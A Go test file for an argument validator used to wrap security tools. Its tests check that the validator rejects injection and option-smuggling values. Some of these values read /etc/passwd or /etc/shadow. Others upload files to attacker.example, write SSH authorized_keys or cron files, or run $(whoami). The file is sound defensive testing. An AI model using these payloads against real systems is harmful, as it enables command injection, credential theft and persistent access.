package validator

import (
	"strings"
	"testing"

	"github.com/thirdkeyai/toolclad/pkg/manifest"
)

func intPtr(v int) *int           { return &v }
func floatPtr(v float64) *float64 { return &v }

func TestValidateArg(t *testing.T) {
	tests := []struct {
		name    string
		def     *manifest.ArgDef
		value   string
		want    string
		wantErr bool
	}{
		// --- string ---
		{
			name:  "string/valid",
			def:   &manifest.ArgDef{Name: "s", Type: "string"},
			value: "hello",
			want:  "hello",
		},
		{
			name:    "string/injection",
			def:     &manifest.ArgDef{Name: "s", Type: "string"},
			value:   "hello; rm -rf /",
			wantErr: true,
		},
		{
			name:  "string/pattern match",
			def:   &manifest.ArgDef{Name: "s", Type: "string", Pattern: `^[a-z]+$`},
			value: "hello",
			want:  "hello",
		},
		{
			name:    "string/pattern mismatch",
			def:     &manifest.ArgDef{Name: "s", Type: "string", Pattern: `^[a-z]+$`},
			value:   "HELLO",
			wantErr: true,
		},

		// --- integer ---
		{
			name:  "integer/valid",
			def:   &manifest.ArgDef{Name: "n", Type: "integer"},
			value: "42",
			want:  "42",
		},
		{
			name:    "integer/not a number",
			def:     &manifest.ArgDef{Name: "n", Type: "integer"},
			value:   "abc",
			wantErr: true,
		},
		{
			name:  "integer/min max valid",
			def:   &manifest.ArgDef{Name: "n", Type: "integer", Min: intPtr(1), Max: intPtr(100)},
			value: "50",
			want:  "50",
		},
		{
			name:    "integer/below min",
			def:     &manifest.ArgDef{Name: "n", Type: "integer", Min: intPtr(10), Max: intPtr(100)},
			value:   "5",
			wantErr: true,
		},
		{
			name:    "integer/above max",
			def:     &manifest.ArgDef{Name: "n", Type: "integer", Min: intPtr(1), Max: intPtr(10)},
			value:   "20",
			wantErr: true,
		},
		{
			name:  "integer/clamp low",
			def:   &manifest.ArgDef{Name: "n", Type: "integer", Min: intPtr(5), Max: intPtr(50), Clamp: true},
			value: "1",
			want:  "5",
		},
		{
			name:  "integer/clamp high",
			def:   &manifest.ArgDef{Name: "n", Type: "integer", Min: intPtr(5), Max: intPtr(50), Clamp: true},
			value: "100",
			want:  "50",
		},

		// --- port ---
		{
			name:  "port/valid",
			def:   &manifest.ArgDef{Name: "p", Type: "port"},
			value: "443",
			want:  "443",
		},
		{
			name:    "port/zero",
			def:     &manifest.ArgDef{Name: "p", Type: "port"},
			value:   "0",
			wantErr: true,
		},
		{
			name:    "port/negative",
			def:     &manifest.ArgDef{Name: "p", Type: "port"},
			value:   "-1",
			wantErr: true,
		},
		{
			name:    "port/too high",
			def:     &manifest.ArgDef{Name: "p", Type: "port"},
			value:   "70000",
			wantErr: true,
		},
		{
			name:    "port/not a number",
			def:     &manifest.ArgDef{Name: "p", Type: "port"},
			value:   "http",
			wantErr: true,
		},

		// --- boolean ---
		{
			name:  "boolean/true",
			def:   &manifest.ArgDef{Name: "b", Type: "boolean"},
			value: "true",
			want:  "true",
		},
		{
			name:  "boolean/false",
			def:   &manifest.ArgDef{Name: "b", Type: "boolean"},
			value: "false",
			want:  "false",
		},
		{
			name:  "boolean/True uppercase",
			def:   &manifest.ArgDef{Name: "b", Type: "boolean"},
			value: "True",
			want:  "true",
		},
		{
			name:    "boolean/invalid",
			def:     &manifest.ArgDef{Name: "b", Type: "boolean"},
			value:   "yes",
			wantErr: true,
		},

		// --- enum ---
		{
			name:  "enum/valid",
			def:   &manifest.ArgDef{Name: "e", Type: "enum", Allowed: []string{"ping", "syn", "service"}},
			value: "syn",
			want:  "syn",
		},
		{
			name:    "enum/invalid value",
			def:     &manifest.ArgDef{Name: "e", Type: "enum", Allowed: []string{"ping", "syn"}},
			value:   "udp",
			wantErr: true,
		},
		{
			name:    "enum/no allowed list",
			def:     &manifest.ArgDef{Name: "e", Type: "enum"},
			value:   "any",
			wantErr: true,
		},

		// --- scope_target ---
		{
			name:  "scope_target/ip",
			def:   &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value: "192.168.1.1",
			want:  "192.168.1.1",
		},
		{
			name:  "scope_target/cidr",
			def:   &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value: "10.0.0.0/24",
			want:  "10.0.0.0/24",
		},
		{
			name:  "scope_target/hostname",
			def:   &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value: "example.com",
			want:  "example.com",
		},
		{
			name:    "scope_target/wildcard",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "*.example.com",
			wantErr: true,
		},
		{
			name:    "scope_target/injection",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "example.com; cat /etc/passwd",
			wantErr: true,
		},
		{
			name:    "scope_target/invalid",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "not a valid target!!!",
			wantErr: true,
		},
		{
			// RFC 1035 / RFC 5891 don't permit terminal whitespace in
			// hostname labels. Must reject regardless of upstream
			// trimming.
			name:    "scope_target/trailing space",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "example.com ",
			wantErr: true,
		},
		{
			name:    "scope_target/leading space",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   " example.com",
			wantErr: true,
		},
		{
			name:    "scope_target/tab",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "\texample.com",
			wantErr: true,
		},
		{
			// RFC 1035 §2.3.4 caps FQDN length at 253 octets.
			name:    "scope_target/over 253 chars",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   strings.Repeat("a", 254),
			wantErr: true,
		},
		{
			// 4096-char buffer-pathological payload from cross-impl harness.
			name:    "scope_target/buffer pathological",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   strings.Repeat("a", 4096),
			wantErr: true,
		},
		{
			name:    "scope_target/empty",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "",
			wantErr: true,
		},

		// --- url ---
		{
			name:  "url/valid http",
			def:   &manifest.ArgDef{Name: "u", Type: "url"},
			value: "https://example.com/path",
			want:  "https://example.com/path",
		},
		{
			name:    "url/no scheme",
			def:     &manifest.ArgDef{Name: "u", Type: "url"},
			value:   "example.com",
			wantErr: true,
		},
		{
			name:  "url/scheme restriction pass",
			def:   &manifest.ArgDef{Name: "u", Type: "url", Schemes: []string{"https"}},
			value: "https://example.com",
			want:  "https://example.com",
		},
		{
			name:    "url/scheme restriction fail",
			def:     &manifest.ArgDef{Name: "u", Type: "url", Schemes: []string{"https"}},
			value:   "http://example.com",
			wantErr: true,
		},

		// --- path ---
		{
			name:  "path/valid_relative",
			def:   &manifest.ArgDef{Name: "f", Type: "path"},
			value: "wordlists/rockyou.txt",
			want:  "wordlists/rockyou.txt",
		},
		{
			name:    "path/absolute_rejected",
			def:     &manifest.ArgDef{Name: "f", Type: "path"},
			value:   "/usr/share/wordlists/rockyou.txt",
			wantErr: true,
		},
		{
			name:    "path/traversal",
			def:     &manifest.ArgDef{Name: "f", Type: "path"},
			value:   "/etc/../etc/passwd",
			wantErr: true,
		},

		// --- ip_address ---
		{
			name:  "ip_address/ipv4",
			def:   &manifest.ArgDef{Name: "ip", Type: "ip_address"},
			value: "192.168.1.1",
			want:  "192.168.1.1",
		},
		{
			name:  "ip_address/ipv6",
			def:   &manifest.ArgDef{Name: "ip", Type: "ip_address"},
			value: "::1",
			want:  "::1",
		},
		{
			name:    "ip_address/invalid",
			def:     &manifest.ArgDef{Name: "ip", Type: "ip_address"},
			value:   "not-an-ip",
			wantErr: true,
		},

		// --- cidr ---
		{
			name:  "cidr/valid",
			def:   &manifest.ArgDef{Name: "c", Type: "cidr"},
			value: "10.0.0.0/24",
			want:  "10.0.0.0/24",
		},
		{
			name:    "cidr/no slash",
			def:     &manifest.ArgDef{Name: "c", Type: "cidr"},
			value:   "10.0.0.0",
			wantErr: true,
		},
		{
			name:    "cidr/invalid",
			def:     &manifest.ArgDef{Name: "c", Type: "cidr"},
			value:   "999.999.999.0/24",
			wantErr: true,
		},

		// --- msf_options ---
		{
			name:  "msf_options/valid single",
			def:   &manifest.ArgDef{Name: "opts", Type: "msf_options"},
			value: "RHOSTS 192.168.1.1",
			want:  "RHOSTS 192.168.1.1",
		},
		{
			name:  "msf_options/valid multiple",
			def:   &manifest.ArgDef{Name: "opts", Type: "msf_options"},
			value: "RHOSTS 192.168.1.1; RPORT 445",
			want:  "RHOSTS 192.168.1.1; RPORT 445",
		},
		{
			name:    "msf_options/invalid key lowercase",
			def:     &manifest.ArgDef{Name: "opts", Type: "msf_options"},
			value:   "rhosts 192.168.1.1",
			wantErr: true,
		},
		{
			name:    "msf_options/missing value",
			def:     &manifest.ArgDef{Name: "opts", Type: "msf_options"},
			value:   "RHOSTS",
			wantErr: true,
		},
		{
			name:    "msf_options/pipe in value",
			def:     &manifest.ArgDef{Name: "opts", Type: "msf_options"},
			value:   "RHOSTS foo|bar",
			wantErr: true,
		},

		// --- credential_file ---
		{
			name:    "credential_file/absolute path",
			def:     &manifest.ArgDef{Name: "cred", Type: "credential_file"},
			value:   "/etc/shadow",
			wantErr: true,
		},
		{
			name:    "credential_file/path traversal",
			def:     &manifest.ArgDef{Name: "cred", Type: "credential_file"},
			value:   "creds/../../../etc/shadow",
			wantErr: true,
		},
		{
			name:    "credential_file/nonexistent",
			def:     &manifest.ArgDef{Name: "cred", Type: "credential_file"},
			value:   "nonexistent_file.txt",
			wantErr: true,
		},

		// --- duration ---
		{
			name:  "duration/plain seconds",
			def:   &manifest.ArgDef{Name: "d", Type: "duration"},
			value: "30",
			want:  "30",
		},
		{
			name:  "duration/minutes",
			def:   &manifest.ArgDef{Name: "d", Type: "duration"},
			value: "5m",
			want:  "5m",
		},
		{
			name:  "duration/hours and minutes",
			def:   &manifest.ArgDef{Name: "d", Type: "duration"},
			value: "1h30m",
			want:  "1h30m",
		},
		{
			name:  "duration/milliseconds",
			def:   &manifest.ArgDef{Name: "d", Type: "duration"},
			value: "500ms",
			want:  "500ms",
		},
		{
			name:    "duration/invalid",
			def:     &manifest.ArgDef{Name: "d", Type: "duration"},
			value:   "five minutes",
			wantErr: true,
		},
		{
			name:    "duration/empty",
			def:     &manifest.ArgDef{Name: "d", Type: "duration"},
			value:   "",
			wantErr: true,
		},

		// --- regex_match ---
		{
			name:  "regex_match/valid",
			def:   &manifest.ArgDef{Name: "r", Type: "regex_match", Pattern: `^[a-z0-9_]+$`},
			value: "hello_world",
			want:  "hello_world",
		},
		{
			name:    "regex_match/no match",
			def:     &manifest.ArgDef{Name: "r", Type: "regex_match", Pattern: `^[a-z0-9_]+$`},
			value:   "HELLO",
			wantErr: true,
		},
		{
			name:    "regex_match/no pattern",
			def:     &manifest.ArgDef{Name: "r", Type: "regex_match"},
			value:   "anything",
			wantErr: true,
		},

		// --- unknown type ---
		{
			name:    "unknown type",
			def:     &manifest.ArgDef{Name: "x", Type: "foobar"},
			value:   "anything",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ValidateArg(tt.def, tt.value)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got nil (value=%q)", got)
				}
				return
			}
			if err != nil {
				t.Errorf("unexpected error: %v", err)
				return
			}
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestValidateArgWithCustomTypes(t *testing.T) {
	customTypes := map[string]*manifest.CustomTypeDef{
		"severity": {
			Base:    "enum",
			Allowed: []string{"low", "medium", "high", "critical"},
		},
		"bounded_int": {
			Base: "integer",
			Min:  intPtr(1),
			Max:  intPtr(100),
		},
	}

	tests := []struct {
		name    string
		def     *manifest.ArgDef
		value   string
		want    string
		wantErr bool
	}{
		{
			name:  "custom enum type valid",
			def:   &manifest.ArgDef{Name: "sev", Type: "severity"},
			value: "high",
			want:  "high",
		},
		{
			name:    "custom enum type invalid",
			def:     &manifest.ArgDef{Name: "sev", Type: "severity"},
			value:   "unknown",
			wantErr: true,
		},
		{
			name:  "custom integer type valid",
			def:   &manifest.ArgDef{Name: "num", Type: "bounded_int"},
			value: "50",
			want:  "50",
		},
		{
			name:    "custom integer type out of range",
			def:     &manifest.ArgDef{Name: "num", Type: "bounded_int"},
			value:   "200",
			wantErr: true,
		},
		{
			name:  "fallback to builtin type",
			def:   &manifest.ArgDef{Name: "p", Type: "port"},
			value: "443",
			want:  "443",
		},
		{
			name:    "custom type with invalid base",
			def:     &manifest.ArgDef{Name: "x", Type: "bad_custom"},
			value:   "anything",
			wantErr: true,
		},
	}

	// Add a custom type with invalid base for testing
	customTypes["bad_custom"] = &manifest.CustomTypeDef{Base: "nonexistent"}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ValidateArgWithCustomTypes(tt.def, tt.value, customTypes)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got nil (value=%q)", got)
				}
				return
			}
			if err != nil {
				t.Errorf("unexpected error: %v", err)
				return
			}
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestNumberType(t *testing.T) {
	tests := []struct {
		name    string
		def     *manifest.ArgDef
		value   string
		wantErr bool
	}{
		{"valid float", &manifest.ArgDef{Name: "n", Type: "number"}, "0.5", false},
		// A negative output starts with '-' and is rejected by the
		// leading-dash rule unless the arg opts in.
		{"negative rejected by leading-dash rule", &manifest.ArgDef{Name: "n", Type: "number"}, "-3.14", true},
		{"negative with allow_leading_dash", &manifest.ArgDef{Name: "n", Type: "number", AllowLeadingDash: true}, "-3.14", false},
		{"NaN rejected", &manifest.ArgDef{Name: "n", Type: "number"}, "NaN", true},
		{"Inf rejected", &manifest.ArgDef{Name: "n", Type: "number"}, "Inf", true},
		{"non-numeric", &manifest.ArgDef{Name: "n", Type: "number"}, "abc", true},
		{
			"min_float ok",
			&manifest.ArgDef{Name: "n", Type: "number", MinFloat: floatPtr(0.0), MaxFloat: floatPtr(1.0)},
			"0.5",
			false,
		},
		{
			"min_float below",
			&manifest.ArgDef{Name: "n", Type: "number", MinFloat: floatPtr(0.0)},
			"-0.1",
			true,
		},
		{
			"max_float above",
			&manifest.ArgDef{Name: "n", Type: "number", MaxFloat: floatPtr(1.0)},
			"1.5",
			true,
		},
		{
			"falls back to int min/max",
			&manifest.ArgDef{Name: "n", Type: "number", Min: intPtr(1), Max: intPtr(10)},
			"5.5",
			false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ValidateArg(tt.def, tt.value)
			if tt.wantErr && err == nil {
				t.Errorf("expected error, got nil")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("unexpected error: %v", err)
			}
		})
	}
}

func TestScopeTargetHardening(t *testing.T) {
	tests := []struct {
		name    string
		value   string
		wantSub string // expected substring in error
	}{
		{"punycode rejected", "xn--example-9c.com", "punycode"},
		{"mixed-case punycode rejected", "XN--example-9c.com", "punycode"},
		{"non-ASCII rejected", "exаmple.com", "ASCII"}, // Cyrillic а
		{"specific traversal message", "../../etc/passwd", "traversal"},
		{"specific slash message", "etc/passwd", "'/'"},
	}
	def := &manifest.ArgDef{Name: "t", Type: "scope_target"}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ValidateArg(def, tt.value)
			if err == nil {
				t.Fatalf("expected error for %q, got none", tt.value)
			}
			if !contains(err.Error(), tt.wantSub) {
				t.Errorf("error %q does not contain %q", err.Error(), tt.wantSub)
			}
		})
	}
}

func contains(haystack, needle string) bool {
	return len(haystack) >= len(needle) && (func() bool {
		for i := 0; i+len(needle) <= len(haystack); i++ {
			if haystack[i:i+len(needle)] == needle {
				return true
			}
		}
		return false
	})()
}

func TestCheckInjection(t *testing.T) {
	tests := []struct {
		value   string
		wantErr bool
	}{
		{"hello", false},
		{"hello world", false},
		{"192.168.1.1", false},
		{"hello;world", true},
		{"$(whoami)", true},
		{"foo|bar", true},
		{"foo&bar", true},
		{"foo`bar`", true},
		{"{}", true},
		{"a<b>c", true},
	}

	for _, tt := range tests {
		t.Run(tt.value, func(t *testing.T) {
			err := CheckInjection(tt.value)
			if tt.wantErr && err == nil {
				t.Error("expected error, got nil")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("unexpected error: %v", err)
			}
		})
	}
}

// TC-1: argument values that smuggle extra options through quoting or
// whitespace must be rejected outright by the string-derived hygiene rules.
func TestTC1PayloadsRejected(t *testing.T) {
	cases := []struct{ typ, value string }{
		{"string", "' -d @/etc/passwd"},
		{"string", "X: y' -d @/etc/passwd -H 'Z: w"},
		{"url", "https://attacker.example/ -o /root/.ssh/authorized_keys"},
		{"url", "https://attacker.example/ -o /tmp/pwned"},
	}
	for _, c := range cases {
		t.Run(c.typ+"/"+c.value, func(t *testing.T) {
			def := &manifest.ArgDef{Name: "v", Type: c.typ}
			if got, err := ValidateArg(def, c.value); err == nil {
				t.Fatalf("template mode: expected rejection, got %q", got)
			}
			// Opting in to whitespace in exec mode must not rescue these:
			// quotes stay banned and url never allows whitespace.
			def.AllowWhitespace = true
			if got, err := ValidateArgMode(def, c.value, true); err == nil {
				t.Fatalf("exec mode with allow_whitespace: expected rejection, got %q", got)
			}
		})
	}
}

// TC-2: option-looking values must never reach the tool as options.
func TestTC2PayloadsRejected(t *testing.T) {
	values := []string{
		"-iL /etc/passwd",
		"--script=/tmp/evil.nse",
		"--script http-fetch --script-args http-fetch.destination=/tmp/d",
	}
	for _, v := range values {
		t.Run(v, func(t *testing.T) {
			def := &manifest.ArgDef{Name: "v", Type: "string"}
			if got, err := ValidateArg(def, v); err == nil {
				t.Fatalf("expected rejection, got %q", got)
			}
			def.AllowWhitespace = true
			if got, err := ValidateArgMode(def, v, true); err == nil {
				t.Fatalf("exec mode with allow_whitespace: expected rejection (leading dash), got %q", got)
			}
		})
	}
}

// TC-3: the leading-dash rule across types, and the allow_leading_dash opt-in.
func TestTC3LeadingDashRejected(t *testing.T) {
	const msg = "must not start with '-' or '+' (set allow_leading_dash = true to permit)"
	cases := []struct{ typ, value string }{
		{"path", "-rf"},
		{"string", "--output=/etc/cron.d/x"},
		{"integer", "-1"},
		{"string", "+short"},
		{"number", "-0.5"},
		{"duration", "-5"},
		{"msf_options", "-RHOSTS 10.0.0.1"},
	}
	for _, c := range cases {
		t.Run(c.typ+"/"+c.value, func(t *testing.T) {
			_, err := ValidateArg(&manifest.ArgDef{Name: "v", Type: c.typ}, c.value)
			if err == nil {
				t.Fatalf("expected rejection")
			}
			if !strings.Contains(err.Error(), msg) {
				t.Fatalf("error %q does not contain %q", err.Error(), msg)
			}
		})
	}

	got, err := ValidateArg(&manifest.ArgDef{Name: "v", Type: "string", AllowLeadingDash: true}, "-v")
	if err != nil || got != "-v" {
		t.Errorf("allow_leading_dash should permit -v, got %q, %v", got, err)
	}
	got, err = ValidateArg(&manifest.ArgDef{Name: "v", Type: "integer", AllowLeadingDash: true}, "-1")
	if err != nil || got != "-1" {
		t.Errorf("allow_leading_dash should permit -1, got %q, %v", got, err)
	}
	// The numeric rule applies to the output value: clamping to a
	// non-negative minimum rescues a negative input.
	got, err = ValidateArg(&manifest.ArgDef{Name: "v", Type: "integer", Min: intPtr(1), Clamp: true}, "-5")
	if err != nil || got != "1" {
		t.Errorf("clamped negative should yield 1, got %q, %v", got, err)
	}
}

func TestValueHygiene(t *testing.T) {
	str := func(allowWS bool) *manifest.ArgDef {
		return &manifest.ArgDef{Name: "v", Type: "string", AllowWhitespace: allowWS}
	}
	tests := []struct {
		name     string
		def      *manifest.ArgDef
		value    string
		execMode bool
		wantErr  string
		want     string
	}{
		{name: "NUL in enum", def: &manifest.ArgDef{Name: "v", Type: "enum", Allowed: []string{"syn\x00"}}, value: "syn\x00", wantErr: "must not contain NUL bytes"},
		{name: "NUL in integer", def: &manifest.ArgDef{Name: "v", Type: "integer"}, value: "1\x00", wantErr: "must not contain NUL bytes"},
		{name: "NUL in boolean", def: &manifest.ArgDef{Name: "v", Type: "boolean"}, value: "true\x00", wantErr: "must not contain NUL bytes"},
		{name: "control char", def: str(false), value: "a\x01b", wantErr: "must not contain control characters"},
		{name: "DEL", def: str(false), value: "a\x7fb", wantErr: "must not contain control characters"},
		{name: "tab without opt-in", def: str(false), value: "a\tb", wantErr: "must not contain control characters"},
		{name: "double quote", def: str(false), value: `a"b`, wantErr: "must not contain quote or backslash characters"},
		{name: "single quote", def: str(false), value: "a'b", wantErr: "must not contain quote or backslash characters"},
		{name: "backslash", def: str(false), value: `a\b`, wantErr: "must not contain quote or backslash characters"},
		{name: "scope_target backslash keeps specific message", def: &manifest.ArgDef{Name: "v", Type: "scope_target"}, value: `a\b`, wantErr: "backslash escape sequences"},
		{name: "space", def: str(false), value: "a b", wantErr: "must not contain whitespace"},
		{name: "nbsp", def: str(false), value: "a b", wantErr: "must not contain whitespace"},
		{name: "allow_whitespace ignored in template mode", def: str(true), value: "a b", execMode: false, wantErr: "must not contain whitespace"},
		{name: "allow_whitespace honored in exec mode", def: str(true), value: "a b", execMode: true, want: "a b"},
		// allow_whitespace permits only the ASCII space; control characters
		// are rejected unconditionally and exotic spaces stay rejected.
		{name: "allow_whitespace tab still rejected", def: str(true), value: "a\tb", execMode: true, wantErr: "must not contain control characters"},
		{name: "allow_whitespace newline still rejected", def: str(true), value: "a\nb", execMode: true, wantErr: "must not contain control characters"},
		{name: "allow_whitespace CR still rejected", def: str(true), value: "a\rb", execMode: true, wantErr: "must not contain control characters"},
		{name: "allow_whitespace vertical tab still rejected", def: str(true), value: "a\vb", execMode: true, wantErr: "must not contain control characters"},
		{name: "allow_whitespace form feed still rejected", def: str(true), value: "a\fb", execMode: true, wantErr: "must not contain control characters"},
		{name: "allow_whitespace nbsp still rejected", def: str(true), value: "a\u00a0b", execMode: true, wantErr: "must not contain whitespace"},
		{name: "allow_whitespace line separator still rejected", def: str(true), value: "a\u2028b", execMode: true, wantErr: "must not contain whitespace"},
		{name: "allow_whitespace ideographic space still rejected", def: str(true), value: "a\u3000b", execMode: true, wantErr: "must not contain whitespace"},
		{name: "C1 control rejected", def: str(true), value: "a\u0085b", execMode: true, wantErr: "must not contain control characters"},
		{name: "msf_options tab rejected", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS\t10.0.0.1", wantErr: "must not contain control characters"},
		{name: "msf_options nbsp rejected", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS\u00a010.0.0.1", wantErr: "must not contain whitespace"},
		{name: "url never allows whitespace", def: &manifest.ArgDef{Name: "v", Type: "url", AllowWhitespace: true}, value: "https://example.com/a b", execMode: true, wantErr: "must not contain whitespace"},
		{name: "msf_options exempt from whitespace rule", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS 10.0.0.1", want: "RHOSTS 10.0.0.1"},
		{name: "msf_options still rejects quotes", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS 'x'", wantErr: "must not contain quote or backslash characters"},
		{name: "path with space rejected", def: &manifest.ArgDef{Name: "v", Type: "path"}, value: "my file.txt", wantErr: "must not contain whitespace"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ValidateArgMode(tt.def, tt.value, tt.execMode)
			if tt.wantErr != "" {
				if err == nil {
					t.Fatalf("expected error containing %q, got value %q", tt.wantErr, got)
				}
				if !strings.Contains(err.Error(), tt.wantErr) {
					t.Fatalf("error %q does not contain %q", err.Error(), tt.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestPatternAnchoring(t *testing.T) {
	str := &manifest.ArgDef{Name: "v", Type: "string", Pattern: "[a-z]+"}
	if _, err := ValidateArg(str, "abc123"); err == nil {
		t.Error("unanchored pattern [a-z]+ must reject abc123")
	}
	if got, err := ValidateArg(str, "abc"); err != nil || got != "abc" {
		t.Errorf("pattern [a-z]+ should accept abc, got %q, %v", got, err)
	}
	rm := &manifest.ArgDef{Name: "v", Type: "regex_match", Pattern: "[a-z]+"}
	if _, err := ValidateArg(rm, "abc123"); err == nil {
		t.Error("regex_match with [a-z]+ must reject abc123")
	}
	custom := map[string]*manifest.CustomTypeDef{"lower": {Base: "string", Pattern: "[a-z]+"}}
	if _, err := ValidateArgWithCustomTypes(&manifest.ArgDef{Name: "v", Type: "lower"}, "abc123", custom); err == nil {
		t.Error("custom type pattern [a-z]+ must reject abc123")
	}
	// Custom types go through hygiene too.
	if _, err := ValidateArgWithCustomTypes(&manifest.ArgDef{Name: "v", Type: "lower"}, "-abc", custom); err == nil {
		t.Error("custom type must apply the leading-dash rule")
	}
}

func TestAnchorPattern(t *testing.T) {
	cases := map[string]string{
		"[a-z]+":   "^(?:[a-z]+)$",
		"^[a-z]+$": "^(?:[a-z]+)$",
		"^abc":     "^(?:abc)$",
		"abc$":     "^(?:abc)$",
		`a\$`:      `^(?:a\$)$`,
		`a\\$`:     `^(?:a\\)$`,
	}
	for in, want := range cases {
		if got := AnchorPattern(in); got != want {
			t.Errorf("AnchorPattern(%q) = %q, want %q", in, got, want)
		}
	}
}
